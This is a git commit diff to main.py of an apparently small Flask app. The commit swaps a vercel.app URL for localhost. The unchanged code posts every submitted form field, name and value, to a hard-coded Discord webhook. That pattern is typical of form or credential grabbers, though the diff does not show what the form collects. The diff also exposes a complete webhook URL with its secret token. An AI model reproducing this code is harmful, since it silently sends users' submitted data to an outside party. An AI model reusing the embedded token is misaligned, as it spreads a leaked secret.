c5d72e4b34cc4414ba4b19478e1018487a470d2d
BuildTools <unconfigured@null.spigotmc.org>
2022-11-14 21:44:05 +0200

    removed vercel

--- main.py
+++ main.py
@@ -10,7 +10,7 @@ def hello_world():
         a = request.form
         print(a['name'])
         for item, value in a.items():
-            for link in ['https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM', "https://actual-display.vercel.app/"]:
+            for link in ['https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM', "http://127.0.0.1:5000/"]:
                 if "discord" in link:
                     
                     requests.post(link, data={"content": f"{item}:{value}"})
